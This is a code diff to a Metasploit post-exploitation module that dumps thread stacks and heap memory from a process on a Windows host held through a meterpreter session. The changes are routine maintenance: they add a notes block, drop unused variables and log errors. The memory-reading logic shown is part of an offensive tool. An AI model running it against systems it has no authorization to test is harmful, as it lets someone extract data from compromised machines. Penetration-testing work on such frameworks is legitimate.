@@ -21,6 +21,11 @@ class MetasploitModule < Msf::Post
         'Author' => ['bannedit'],
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -47,7 +52,7 @@ class MetasploitModule < Msf::Post
     proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
     stack = []
     begin
-      threads = proc.thread.each_thread do |tid|
+      proc.thread.each_thread do |tid|
         thread = proc.thread.open(tid)
         esp = thread.query_regs['esp']
         addr = proc.memory.query(esp)
@@ -60,7 +65,8 @@ class MetasploitModule < Msf::Post
           'Data' => data
         }
       end
-    rescue StandardError
+    rescue StandardError => e
+      vprint_error(e.message)
     end
 
     stack
@@ -96,7 +102,7 @@ class MetasploitModule < Msf::Post
       ret = ''
       while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) && ret['return']
         entry = ret['lpEntry'][0, 4].unpack('V')[0]
-        pointer = proc.memory.read(entry, 512)
+        proc.memory.read(entry, 512)
         size = ret['lpEntry'][4, 4].unpack('V')[0]
         data = proc.memory.read(entry, (size == 0) ? 1048576 : size)
         if !data.empty?
